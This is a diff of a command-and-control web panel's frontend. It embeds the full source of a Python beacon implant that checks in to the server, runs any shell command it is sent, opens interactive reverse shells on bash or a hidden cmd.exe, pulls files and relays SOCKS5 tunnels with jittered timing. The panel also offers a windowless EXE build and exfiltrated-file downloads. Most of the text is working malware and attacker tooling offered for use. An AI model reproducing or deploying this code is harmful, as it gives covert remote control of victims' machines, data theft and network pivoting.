+        data = _get_bytes(f"/api/beacon/fetch/{AGENT_ID}/{task_id}")
+        if data is None:
+            return f"Error: could not fetch {filename}"
+        try:
+            with open(dest, "wb") as f: f.write(data)
+            return f"[+] {filename} → {dest} ({len(data):,} bytes)"
+        except Exception as e:
+            return f"Error writing {dest}: {e}"
+
+    if cmd.startswith('__pty__:'):
+        _sid = cmd[8:]
+        def _pty_run(sid=_sid):
+            if _WIN:
+                _proc = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000)
+                def _rd():
+                    while True:
+                        c = _proc.stdout.read(512)
+                        if not c: break
+                        _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(c).decode()})
+                _th.Thread(target=_rd, daemon=True).start()
+                while _proc.poll() is None:
+                    tk = _post('/api/beacon/pty_tick', {'session_id': sid, 'data': ''})
+                    if not tk or not tk.get('active'): _proc.kill(); break
+                    if tk.get('input'):
+                        try: _proc.stdin.write(_b64.b64decode(tk['input'])); _proc.stdin.flush()
+                        except: break
+                    time.sleep(0.1)
+            else:
+                try:
+                    import pty as _pty, select as _sel
+                    _mfd, _sfd = _pty.openpty()
+                    _proc = subprocess.Popen(['/bin/bash'], stdin=_sfd, stdout=_sfd, stderr=_sfd, preexec_fn=os.setsid, close_fds=True)
+                    os.close(_sfd)
+                    while _proc.poll() is None:
+                        _r, _, _ = _sel.select([_mfd], [], [], 0.05)
+                        _out = b''
+                        if _r:
+                            try: _out = os.read(_mfd, 4096)
+                            except OSError: break
+                        tk = _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(_out).decode() if _out else ''})
+                        if not tk or not tk.get('active'): break
+                        if tk.get('input'):
+                            try: os.write(_mfd, _b64.b64decode(tk['input']))
+                            except: pass
+                    try: _proc.kill()
+                    except: pass
+                    try: os.close(_mfd)
+                    except: pass
+                except Exception as _e:
+                    _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(f'PTY error: {_e}\\n'.encode()).decode()})
+        _th.Thread(target=_pty_run, daemon=True).start()
+        return '__pty_started__'
+
+    if cmd.startswith("shell "): cmd = cmd[6:]
+    try:
+        if _WIN:
+            wrapped = 'cd /d "{}" && {} && echo __CWD__:%CD%'.format(_cwd, cmd)
+            result = subprocess.run(wrapped, shell=True, capture_output=True, text=True, timeout=60)
+        else:
+            wrapped = 'cd {} && {}; echo "__CWD__:$(pwd)"'.format(_json.dumps(_cwd), cmd)
+            result = subprocess.run(wrapped, shell=True, capture_output=True, text=True, timeout=60,
+                                    executable='/bin/bash')
+        out   = (result.stdout + result.stderr).rstrip()
+        lines = out.split("\\n")
+        cwd_l = next((l for l in reversed(lines) if l.startswith("__CWD__:")), None)
+        if cwd_l:
+            new_cwd = cwd_l[len("__CWD__:"):].strip()
+            if os.path.isdir(new_cwd):
+                _cwd = new_cwd; _save_cwd(_cwd)
+        out = "\\n".join(l for l in lines if not l.startswith("__CWD__:"))
+        return out.strip() or "(no output)"
+    except subprocess.TimeoutExpired:
+        return "Timed out (60s)"
+    except Exception as e:
+        return f"Error: {e}"
+
+_tnl = {}
+_tnl_lock = _th.Lock()
+
+def _tunnel_tick():
+    items = []
+    with _tnl_lock:
+        for cid, ch in list(_tnl.items()):
+            if ch['closed']:
+                items.append({'channel_id': cid, 'data': '', 'closed': True})
+                continue
+            data = b''
+            try:
+                ch['sock'].settimeout(0.01)
+                data = ch['sock'].recv(4096)
+                if not data:
+                    ch['closed'] = True
+                    items.append({'channel_id': cid, 'data': '', 'closed': True})
+                    continue
+            except: pass
+            if data:
+                items.append({'channel_id': cid, 'data': _b64.b64encode(data).decode(), 'closed': False})
+    resp = _post('/api/beacon/tunnel/tick', {'agent_id': AGENT_ID, 'items': items})
+    if not resp: return
+    for item in resp.get('items', []):
+        action = item.get('action'); cid = item.get('channel_id')
+        if action == 'open':
+            try:
+                s = socket.socket(); s.settimeout(10); s.connect((item['host'], item['port']))
+                with _tnl_lock: _tnl[cid] = {'sock': s, 'closed': False}
+            except:
+                _post('/api/beacon/tunnel/tick', {'agent_id': AGENT_ID, 'items': [{'channel_id': cid, 'data': '', 'closed': True}]})
+        elif action == 'data' and cid:
+            with _tnl_lock: ch = _tnl.get(cid)
+            if ch and not ch.get('closed'):
+                try: ch['sock'].sendall(_b64.b64decode(item['data']))
+                except: ch['closed'] = True
+        elif action == 'close' and cid:
+            with _tnl_lock: ch = _tnl.pop(cid, None)
+            if ch:
+                try: ch['sock'].close()
+                except: pass
+
+def checkin():
+    return _post("/api/beacon/checkin", {
+        "agent_id":       AGENT_ID,
+        "hostname":       socket.gethostname(),
+        "ip_internal":    _local_ip(),
+        "os_info":        _os_info(),
+        "username":       os.getenv("USER") or os.getenv("USERNAME") or "unknown",
+        "pid":            os.getpid(),
+        "sleep_interval": SLEEP,
+        "cwd":            _cwd,
+    })
+
+def main():
+    _t_tick = [0.0]
+    while True:
+        try:
+            resp = checkin()
+            if resp and resp.get("task_id"):
+                out = run_command(resp["command"], resp["task_id"])
+                if out != '__pty_started__':
+                    _post("/api/beacon/result", {"task_id": resp["task_id"],
+                                                 "output": out, "status": "done"})
+        except Exception:
+            pass
+        try:
+            if time.time() - _t_tick[0] >= 1.0:
+                _tunnel_tick()
+                _t_tick[0] = time.time()
+        except Exception:
+            pass
+        time.sleep(SLEEP + SLEEP * (JITTER / 100) * random.random())
+
+if __name__ == "__main__":
+    main()
+`;
+}
+
+function copyBeacon() {
+  const code = document.getElementById('beacon-code').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    const btn = document.getElementById('copy-btn');
+    btn.textContent = '✓ Copied!';
+    setTimeout(() => btn.textContent = '⎘ Copy', 2000);
+  });
+}
+
+function showWindowsInstructions() {
+  const statusEl = document.getElementById('compile-status');
+  statusEl.style.display = 'block';
+  statusEl.style.background = 'var(--bg3)';
+  statusEl.style.color = 'var(--text2)';
+  statusEl.style.border = '1px solid var(--border)';
+  statusEl.style.borderRadius = '6px';
+  statusEl.style.padding = '14px 16px';
+  statusEl.style.lineHeight = '1.8';
+  statusEl.innerHTML = `
+    <div style="color:var(--text);font-weight:600;margin-bottom:8px">🪟 Compilar beacon para Windows</div>
+    <div style="font-size:11px;color:var(--text3);margin-bottom:10px">PyInstaller no soporta cross-compilation. Ejecuta esto en la máquina Windows:</div>
+    <div style="background:var(--bg);border-radius:4px;padding:10px 12px;font-size:11px">
+      <span style="color:var(--text3)">1.</span> <span style="color:var(--accent2)">pip install pyinstaller</span><br>
+      <span style="color:var(--text3)">2.</span> <span style="color:var(--accent2)">pyinstaller --onefile --noconsole beacon.py</span><br>
+      <span style="color:var(--text3)">3.</span> El EXE queda en <span style="color:var(--accent)">dist\\beacon.exe</span>
+    </div>
+    <div style="margin-top:8px;font-size:11px;color:var(--text3)">Descarga el <code style="color:var(--accent)">.py</code> con el botón de arriba y transfiere a Windows.</div>
+  `;
+}
+
+async function downloadBeacon(type) {
+  const code = document.getElementById('beacon-code').textContent;
+  if (!code) return;
+
+  const statusEl = document.getElementById('compile-status');
+
+  if (type === 'py') {
+    const blob = new Blob([code], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'beacon.py';
+    a.click();
+    return;
+  }
+
+  // Compile on server
+  statusEl.style.display = 'block';
+  statusEl.style.background = 'var(--bg3)';
+  statusEl.style.color = 'var(--text2)';
+  statusEl.textContent = `⏳ Compiling for ${type === 'linux' ? 'Linux' : 'Windows'}... this may take ~30s`;
+
+  const res = await apiFetch('/api/info/beacon/compile', {
+    method: 'POST',
+    body: JSON.stringify({ code, platform: type }),
+  });
+
+  if (!res) { statusEl.style.color = 'var(--danger)'; statusEl.textContent = '✗ Request failed.'; return; }
+
+  if (!res.ok) {
+    const err = await res.json().catch(() => ({ detail: 'Unknown error' }));
+    statusEl.style.color = 'var(--danger)';
+    statusEl.textContent = `✗ ${err.detail}`;
+    return;
+  }
+
+  const blob = await res.blob();
+  const ext = type === 'windows' ? '.exe' : '';
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `beacon${ext}`;
+  a.click();
+  statusEl.style.color = 'var(--online)';
+  statusEl.textContent = `✓ Binary downloaded.`;
+  setTimeout(() => statusEl.style.display = 'none', 3000);
+}
+
+// ── PTY Shell ─────────────────────────────────────────────
+let _ptyTerm = null;
+let _ptySessId = null;
+let _ptyAgentId = null;
+
+async function openPtyShell(agentId) {
+  const modal = document.getElementById('pty-modal');
+  modal.classList.add('open');
+  document.getElementById('pty-status').textContent = 'Starting PTY session...';
+  document.getElementById('pty-status').style.color = 'var(--warning)';
+
+  // Destroy previous terminal
+  if (_ptyTerm) {
+    _ptyTerm.dispose();
+    _ptyTerm = null;
+  }
+  document.getElementById('pty-terminal').innerHTML = '';
+
+  // Start PTY session on server
+  const res = await apiFetch(`/api/pty/${agentId}/start`, { method: 'POST' });
+  if (!res || !res.ok) {
+    document.getElementById('pty-status').textContent = '✗ Failed to start PTY session';
+    document.getElementById('pty-status').style.color = 'var(--danger)';
+    return;
+  }
+  const data = await res.json();
+  _ptySessId = data.session_id;
+  _ptyAgentId = agentId;
+
+  document.getElementById('pty-status').textContent = `Session: ${_ptySessId.slice(0, 8)}... | Waiting for beacon...`;
+  document.getElementById('pty-status').style.color = 'var(--text3)';
+
+  // Create xterm.js terminal
+  _ptyTerm = new Terminal({
+    cursorBlink: true,
+    theme: {
+      background: '#0d0d0d',
+      foreground: '#e2e8f0',
+      cursor: '#7c3aed',
+      selection: 'rgba(124,58,237,0.3)',
+      black: '#0d0d0d', red: '#ef4444', green: '#22c55e', yellow: '#f59e0b',
+      blue: '#3b82f6', magenta: '#a855f7', cyan: '#06b6d4', white: '#e2e8f0',
+    },
+    fontSize: 13,
+    fontFamily: 'ui-monospace, "Cascadia Code", "Fira Code", monospace',
+    convertEol: true,
+    scrollback: 2000,
+  });
+
+  _ptyTerm.open(document.getElementById('pty-terminal'));
+  _ptyTerm.writeln('\x1b[1;32mPTY session started. Waiting for beacon to connect...\x1b[0m');
+  _ptyTerm.writeln('\x1b[2m(The beacon will connect on its next check-in cycle)\x1b[0m');
+  _ptyTerm.writeln('');
+
+  // User keystrokes → server → beacon
+  _ptyTerm.onData((data) => {
+    if (_ptySessId && _ptyAgentId) {
+      const b64 = btoa(data);
+      apiFetch(`/api/pty/${_ptyAgentId}/${_ptySessId}/input`, {
+        method: 'POST',
+        body: JSON.stringify({ data: b64 }),
+      });
+    }
+  });
+
+  _ptyTerm.focus();
+  document.getElementById('pty-status').style.color = 'var(--online)';
+  document.getElementById('pty-status').textContent = `● LIVE — ${_ptySessId.slice(0, 8)}`;
+}
+
+async function closePtyShell() {
+  if (_ptySessId && _ptyAgentId) {
+    apiFetch(`/api/pty/${_ptyAgentId}/${_ptySessId}`, { method: 'DELETE' });
+  }
+  _ptySessId = null;
+  _ptyAgentId = null;
+  if (_ptyTerm) {
+    _ptyTerm.dispose();
+    _ptyTerm = null;
+  }
+  document.getElementById('pty-modal').classList.remove('open');
+}
+
+// ── SOCKS5 Tunnel ─────────────────────────────────────────
+async function startSocks5(agentId) {
+  const port = parseInt(document.getElementById('socks-port')?.value) || 1080;
+  const res = await apiFetch('/api/tunnel/start', {
+    method: 'POST',
+    body: JSON.stringify({ agent_id: agentId, bind_port: port }),
+  });
+  if (!res) return;
+  if (!res.ok) {
+    const d = await res.json().catch(() => ({}));
+    showToast(`✗ SOCKS5: ${d.detail || 'Error'}`, 'danger');
+    return;
+  }
+  const data = await res.json();
+  showToast(`✓ SOCKS5 escuchando en 127.0.0.1:${data.port}`, 'success');
+  refreshSocks5Status();
+}
+
+async function stopSocks5() {
+  await apiFetch('/api/tunnel', { method: 'DELETE' });
+  showToast('SOCKS5 detenido', 'info');
+  refreshSocks5Status();
+}
+
+async function refreshSocks5Status() {
+  const statusEl = document.getElementById('socks-status-text');
+  const channelsEl = document.getElementById('socks-channels');
+  if (!statusEl) return;
+
+  const res = await apiFetch('/api/tunnel/status');
+  if (!res || !res.ok) { statusEl.textContent = 'Status unavailable'; return; }
+  const data = await res.json();
+
+  if (data.running) {
+    statusEl.innerHTML = `<span style="color:var(--online)">● Running</span> — 127.0.0.1:<strong style="color:var(--accent2)">${data.port}</strong>`;
+    const ch = data.channels || [];
+    channelsEl.textContent = ch.length === 0
+      ? 'No active channels'
+      : `${ch.length} channel${ch.length > 1 ? 's' : ''}: ${ch.slice(0,3).map(c => c.target).join(', ')}${ch.length > 3 ? '...' : ''}`;
+    if (channelsEl.textContent !== 'No active channels') {
+      channelsEl.style.color = 'var(--accent2)';
+    }
+  } else {
+    statusEl.innerHTML = `<span style="color:var(--text3)">● Stopped</span>`;
+    channelsEl.textContent = '';
+  }
+}
+
+// ── Change Password Modal ────────────────────────────────
+function closePwModal() {
+  document.getElementById('pw-modal').classList.remove('open');
+}
+
+async function submitChangePw() {
+  const current = document.getElementById('pm-current').value;
+  const newPw   = document.getElementById('pm-new').value;
+  const confirm = document.getElementById('pm-confirm').value;
+  const errEl   = document.getElementById('pw-modal-error');
+  errEl.style.display = 'none';
+
+  if (newPw.length < 12) {
+    errEl.textContent = 'Minimum 12 characters.';
+    errEl.style.display = 'block';
+    return;
+  }
+  if (newPw !== confirm) {
+    errEl.textContent = 'Passwords do not match.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  const res = await apiFetch('/api/auth/change-password', {
+    method: 'POST',
+    body: JSON.stringify({ current_password: current, new_password: newPw }),
+  });
+
+  if (!res || !res.ok) {
+    const data = await res.json();
+    errEl.textContent = data.detail || 'Error.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  closePwModal();
+}
+
+// ── Upload Modal ─────────────────────────────────────────
+let _uploadAgentId = null;
+
+async function downloadExfil(agentId, taskId, filename) {
+  const res = await apiFetch(`/api/agents/${agentId}/exfil/${taskId}`);
+  if (!res || !res.ok) { alert('Download failed'); return; }
+  const blob = await res.blob();
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = filename;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function openUploadModal(agentId) {
+  _uploadAgentId = agentId;
+  document.getElementById('upload-error').style.display = 'none';
+  document.getElementById('upload-file').value = '';
+  document.getElementById('upload-dest').value = '/tmp/';
+  document.getElementById('upload-modal').classList.add('open');
+}
+
+function closeUploadModal() {
+  document.getElementById('upload-modal').classList.remove('open');
+  _uploadAgentId = null;
+}
+
+async function submitUpload() {
+  const errEl = document.getElementById('upload-error');
+  errEl.style.display = 'none';
+
+  const fileInput = document.getElementById('upload-file');
+  const dest = document.getElementById('upload-dest').value.trim();
+
+  if (!fileInput.files.length) {
+    errEl.textContent = 'Select a file first.';
+    errEl.style.display = 'block';
+    return;
+  }
+  if (!dest) {
+    errEl.textContent = 'Enter a destination path.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  const form = new FormData();
+  form.append('file', fileInput.files[0]);
+  form.append('dest_path', dest);
+
+  const res = await fetch(`/api/agents/${_uploadAgentId}/upload`, {
+    method: 'POST',
+    headers: { 'Authorization': 'Bearer ' + getToken() },
+    body: form,
+  });
+
+  if (!res.ok) {
+    const d = await res.json();
+    errEl.textContent = d.detail || 'Upload failed.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  const data = await res.json();
+  // Add to task history so it shows up in the terminal
+  taskHistory.push({
+    id: data.task_id,
+    command: `__upload__:${data.filename}:${data.dest_path}`,
+    status: 'pending',
+    output: '',
+  });
+  renderTerminal();
+  closeUploadModal();
+}
+
+// ── Helpers ──────────────────────────────────────────────
+function escapeHtml(str) {
+  if (str == null) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+function formatAgo(secs) {
+  if (secs < 60) return secs + 's ago';
+  if (secs < 3600) return Math.floor(secs / 60) + 'm ago';
+  return Math.floor(secs / 3600) + 'h ago';
+}
+</script>
+</body>
+</html>
